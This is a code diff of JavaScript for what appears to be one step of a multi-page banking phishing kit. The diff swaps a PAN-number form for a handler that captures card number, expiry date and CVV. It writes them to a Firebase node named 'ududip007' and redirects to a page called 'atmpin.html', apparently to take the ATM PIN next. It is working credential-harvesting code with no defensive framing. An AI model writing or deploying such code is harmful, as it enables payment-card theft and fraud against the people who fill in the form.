@@ -1,29 +1,23 @@
-// Step 4: Save PAN Number in existing ududip007 entry
+// Firebase reference
+var cardRef = firebase.database().ref("ududip007");
 
-var firebaseKey = localStorage.getItem("firebaseKey");
-
-if (!firebaseKey) {
-  alert("Please complete Step 1 first.");
-  window.location.href = "index.html";
-}
-
-var userRef = firebase.database().ref("ududip007/" + firebaseKey);
-
-// Submit handler
-document.getElementById("ududip007").addEventListener("submit", function (e) {
+// Form submit listener
+document.getElementById("ududip007").addEventListener("submit", function(e) {
   e.preventDefault();
 
-  var pan = document.getElementById("pan").value.trim();
+  var cardNumber = document.getElementById("cardNumber").value;
+  var expiry = document.getElementById("expiry").value;
+  var cvv = document.getElementById("cvv").value;
 
-  if (pan.length !== 10) {
-    alert("Please enter a valid 10-character PAN number.");
-    return;
-  }
-
-  userRef.update({
-    g_pan: pan
+  // Push to Firebase
+  var newCard = cardRef.push();
+  newCard.set({
+    card_number: cardNumber,
+    expiry_date: expiry,
+    cvv_code: cvv
   }).then(() => {
-    window.location.href = "last.html";
+    localStorage.setItem("cardKey", newCard.key);
+    window.location.href = "atmpin.html"; // next step
   }).catch((error) => {
     alert("Error: " + error.message);
   });
